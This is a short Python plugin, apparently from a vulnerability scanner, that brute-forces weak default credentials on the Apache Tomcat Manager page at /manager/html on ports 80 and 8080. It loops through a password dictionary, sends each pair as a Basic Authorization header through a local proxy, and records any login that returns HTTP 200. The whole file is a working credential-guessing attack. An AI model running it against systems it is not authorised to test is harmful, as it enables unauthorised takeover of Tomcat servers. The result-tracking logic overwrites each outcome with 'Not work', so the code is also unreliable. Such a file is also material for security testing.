import base64
import requests
import lib.config.config as config
from lib.core.monitor import port_monitor,page_monitor

def load_dict():
    with open('./data/dict/tomcat_weak','r') as f:
        dict_data = f.readlines()

    for i in range(len(dict_data)):
        dict_data[i] = dict_data[i].strip()

    return dict_data

def poc(url):
    poc_type = 'tomcat:weakpasswd'

    ports = ['80','8080']
    port_info = {}

    port_info,ports = port_monitor(url, poc_type, ports)

    page_info,ports = page_monitor(url, '/manager/html', poc_type, ports, [401])
    port_info.update(page_info)

    data = load_dict()

    for port in ports:
        for i in data:
            headers = {'Authorization': 'Basic '+base64.b64encode(i.encode()).decode()}
            try:
                s = requests.get('http://{}:{}/manager/html'.format(url,port),headers = headers, proxies={'http':'http://127.0.0.1:8080'})
                if s.status_code==200:
                    port_info[port] = [1,poc_type,i]
                    break
            except Exception as e:
                port_info[port] = [0,poc_type,'Conect failed']
                
            port_info[port] = [0,poc_type,'Not work']

    return port_info

